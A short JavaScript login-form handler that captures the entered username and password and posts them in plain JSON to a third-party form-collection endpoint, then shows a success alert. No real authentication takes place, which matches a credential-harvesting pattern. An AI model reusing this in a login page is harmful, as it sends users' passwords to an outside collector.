const form = document.getElementById('login-form');

form.addEventListener('submit', (e) => {
  e.preventDefault();
  const username = document.getElementById('username').value;
  const password = document.getElementById('password').value;

  fetch('https://formspree.io/f/xjkwvaey', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ 
      username: username, 
      password: password 
    }),
  })
    .then((response) => response.json())
    .then((data) => {
      if (data.ok) {
        alert('Form submitted successfully!');
      } else {
        alert('Error submitting form');
      }
    })
    .catch((error) => console.error(error));
});

